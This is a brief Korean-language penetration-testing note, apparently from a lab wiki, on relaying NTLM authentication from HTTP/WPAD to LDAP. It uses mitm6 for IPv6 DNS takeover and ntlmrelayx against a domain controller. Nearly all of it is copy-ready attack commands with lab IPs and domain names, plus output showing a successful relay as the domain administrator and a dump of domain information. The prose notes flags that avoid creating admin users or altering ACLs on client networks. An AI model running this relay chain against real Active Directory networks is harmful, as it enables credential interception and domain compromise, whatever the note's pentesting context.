# HTTP to LDAP - TODO



### MITM6 + SMB to LDAP&#x20;

* MITM6 를 이용해 SMB&#x20;

```
# 1. MITM6 세팅 
python3 mitm6.py -d <도메인> --ignore-nofqdn

# 1-1. 특정 호스트만 화이트리스트 처리 후 mitm6 공격 
python3 mitm6.py -d <도메인> --ignore-nofqdn -hw <호스트 FQDN>
python3 mitm6.py -d choi.local --ignore-nofqdn -hw wkstn01.choi.local

# 2. ntlmrelayx 세팅 
python3 ntlmrelayx.py -t ldap://<ip> -wh <wpad-이름-아무거나> -6 --no-da --no-acl
python3 ntlmrelayx.py -t ldap://192.168.40.150 -wh choipad -6 --no-da --no-acl

# ntlmrelayx 공격 결과 
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Connection from ::ffff:192.168.40.151 controlled, attacking target ldap://192.168.40.150
[*] HTTPD(80): Authenticating against ldap://192.168.40.150 as CHOI/ADMINISTRATOR SUCCEED
[*] Domain info dumped into lootdir!

```

ntlmrelayx 의 기본적인 LDAP 공격은 도메인 어드민 유저를 생성한다거나 ACL 공격을 함부로 진행하는 등의 고객사 네트워크에 사용하기엔 좀 위험한 공격들이 있다. 따라서 `--no-da` 와 `--no-acl` 등의 플래그를 이용해서 기본 공격들을 진행하지 않는다.&#x20;

위 실습에서는 오로지 도메인 정보만 덤프하는 아주 기본적인 공격을 진행했다. 사실상 BloodHound 를 실행한 것과 같은 공격이다.&#x20;

